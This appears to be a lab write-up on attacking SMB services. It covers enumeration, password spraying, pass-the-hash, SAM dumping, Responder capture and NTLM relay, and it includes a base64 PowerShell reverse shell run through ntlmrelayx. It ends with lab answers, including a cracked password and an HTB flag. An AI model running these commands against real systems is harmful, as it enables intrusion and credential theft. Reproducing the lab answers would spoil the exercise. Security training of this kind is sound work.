
Most tools that interact with SMB allow null session connectivity, including `smbclient`, `smbmap`, `rpcclient`, or `enum4linux`

**File Share - smbclient**
```go
smbclient -N -L //10.129.14.128
```

##### Download a file from a known share
```go
smbclient //dc01/julio -k -c 'get julio.txt'
```

**Smbmap**

An advantage of `smbmap` is that it provides a list of permissions for each shared folder.
```go
smbmap -H 10.129.14.128
```

Recursively browse the directories with the `-r `or `-R` option:
```go
 smbmap -H 10.129.14.128 -r notes
```

Download a file from the directory. Suppose there's a directory on the share with a `notes.txt` file:
```go
smbmap -H 10.129.14.128 --download "notes\note.txt"
```

Now suppose you want to upload a `test.txt` file to said share directory:
```go
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

#### Remote Procedure Call

**rpcclient**

Use this tool to enumerate Domain Controllers or workstations. This tool can also be used with a null session
```go
rpcclient -U'%' 10.10.110.17
```

Enum4linux is another utility that supports null sessions
```go
./enum4linux-ng.py 10.10.11.45 -A -C
```


### Protocol Specific Attacks


CrackMapExec on SMB - Password Spraying

```shell-session
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
```

**Impacket PsExec**
To use `impacket-psexec`, we need to provide the domain/username, the password, and the IP address of our target machine

Connect to a remote machine with a local administrator account, using `impacket-psexec`
```shell-session
impacket-psexec administrator:'Password123!'@10.10.110.17
```

**CrackMapExec**

CrackMapExec holds a distinct advantage; the ability to run commands on multiple hosts
```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
```
	-x: run cmd commands
	-X: run PowerShell commands

**Enumerating Logged-on Users**
Use `CrackMapExec` to enumerate logged-on users on all machines within the same network if some of them share the same local admin account.

```shell-session
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```

**Extract Hashes from SAM Database**

The Security Account Manager (SAM) is a database file that stores users' passwords. It can be used to authenticate local and remote users. If we get administrative privileges on a machine, we can extract the SAM database hashes for different purposes

```shell-session
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
```

**PtH**

Use the NTLM hash to authenticate over SMB. Use a PtH attack with any `Impacket` tool, `SMBMap`, `CrackMapExec`, among other tools
```shell-session
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

**Forced Authentication Attacks**

Abuse the SMB protocol by creating a fake SMB Server to capture users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4) via `Responder`

Create a fake SMB server with Responder's default configuration
```shell-session
responder -I <interface name>
```

A user attempting to connect to a share folder named /files but misspells it with /fiiles may connect to our fake SMB due to a multicast query to all devices on the network

```shell-session
sudo responder -I ens33
```

Once credentials are captured, the hash can be cracked with hashcat

**hashcat**
```shell-session
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

But if the hash can't be cracked relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). However, a few things need to be configured:

1. Set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`
```shell-session
cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`
```shell-session
impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
```

2. Create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).
```shell-session
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIAMgAwAC4AMQAzADMAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.
```shell-session
nc -lvnp 9001
```


### Questions

**1. What is the name of the shared folder with READ permissions?** 

**nmap**
```
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 71:08:b0:c4:f3:ca:97:57:64:97:70:f9:fe:c5:0c:7b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEtihrnXMQHWhwZCWFPcX8gmBy8EEBjJ9T5lR/9onJz7XvUdcPTsaOovhhVrgFaQu1U5ekn4V+OYuIxJrEfl0dcBhSqQSb81MO3bTK5yZ+rQ958rl5PiYwKGeFc0VR9P3abEdKRn7bcEoXKSRoMof6vwkJMzb5N/7JBFYUo/jfbzovKEkX4t4Bwh6W4dmcPL6Mh4DJjhaHX6qZcC4MZoOV2oLW82T0tfH/KNLsMXBJ/Yqh8GziGy+jcLl31abch2+inXHTdKhoCOHR+A970VjskUs2iWCRsNkYREtTtpCZ738m1gdMQS+BzV2ZhRRcDnGOXMzR7Rk5Azs+luaGNzRlb1q2+NSQlmGzgBEPvIoL4/pBDM3fb8ZiL4gWvq3bqyPGdOi2nZfbpyeYzAqUe6THRvwjAS1wWUMLNt6jgt13xCTVOZV4hKMmLneb/VQXRoDFBF/vFoFDiPxeVNaM7dvBVQIBYbkBLqjYLVV1IFr2otRIbtVrLU+/D/mJvmXM3Xs=
|   256 45:c3:b5:14:63:99:3d:9e:b3:22:51:e5:97:76:e1:50 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGrNZZh3PTca9YkLp+xpAXtquE6wsTwEZmBtt6mism0idkizZWojfLqjeonge0ZYBEfXjTgMsfJ366hpWedHE8U=
|   256 2e:c2:41:66:46:ef:b6:81:95:d5:aa:35:23:94:55:38 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlAiOeV++/9T5HzXC37wJRor3PaSuVOGLaNFz7pEl1/
53/tcp   open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2121/tcp open  ftp         ProFTPD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-12-01T12:59:41
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| nbstat: NetBIOS name: ATTCSVC-LINUX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   ATTCSVC-LINUX<00>    Flags: <unique><active>
|   ATTCSVC-LINUX<03>    Flags: <unique><active>
|   ATTCSVC-LINUX<20>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1e>        Flags: <group><active>
| Statistics:
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|   00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
|_  00:00:00:00:00:00:00:00:00:00:00:00:00:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 22376/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 64191/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 21254/udp): CLEAN (Failed to receive data)
|   Check 4 (port 22270/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s
```

**smbmap**
```go
smbmap -H 10.129.203.6                          

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB
[*] Established 1 SMB session(s)                                
                                                                                                    
[+] IP: 10.129.203.6:445        Name: 10.129.203.6              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        GGJ                                                     READ ONLY       Priv
        IPC$                                                    NO ACCESS       IPC Service (attcsvc-linux Samba)
```

**2. What is the password for the username "jason"?**
```go
─$ crackmapexec smb 10.129.203.6 -u jason -p pws.list --local-auth
SMB         10.129.203.6    445    ATTCSVC-LINUX    [*] Windows 6.1 Build 0 (name:ATTCSVC-LINUX) (domain:ATTCSVC-LINUX) (signing:False) (SMBv1:False)
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:liverpool STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:theman STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-

SNIP

LINUX\jason:warrior STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [-] ATTCSVC-LINUX\jason:1q2w3e4r5t STATUS_LOGON_FAILURE 
SMB         10.129.203.6    445    ATTCSVC-LINUX    [+] ATTCSVC-LINUX\==jason:34c8zuNBo91!@28Bszh==
```

password is : **34c8zuNBo91!@28Bszh**

**3. Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer.**
```
smbclient -U jason //10.129.203.6/GGJ

Password for [WORKGROUP\jason]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Apr 19 17:33:55 2022
  ..                                  D        0  Mon Apr 18 13:08:30 2022
  id_rsa                              N     3381  Tue Apr 19 17:33:04 2022

                14384136 blocks of size 1024. 10079636 blocks available
smb: \> ==get id_rsa==
getting file \id_rsa of size 3381 as id_rsa (10.8 KiloBytes/sec) (average 10.8 KiloBytes/sec)
smb: \> 
```

Change the permissions on the private key to 600. 

Get the flag!

```
ssh -i id_rsa jason@10.129.203.6

Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 02 Dec 2023 04:04:59 AM UTC

  System load:  0.64               Processes:               233
  Usage of /:   25.5% of 13.72GB   Users logged in:         0
  Memory usage: 15%                IPv4 address for ens160: 10.129.203.6
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Tue Apr 19 21:50:46 2022 from 10.10.14.20
$ ll
-sh: 1: ll: not found
$ ls
flag.txt
$ cat flag.txt  
==HTB{SMB_4TT4CKS_2349872359}==

```
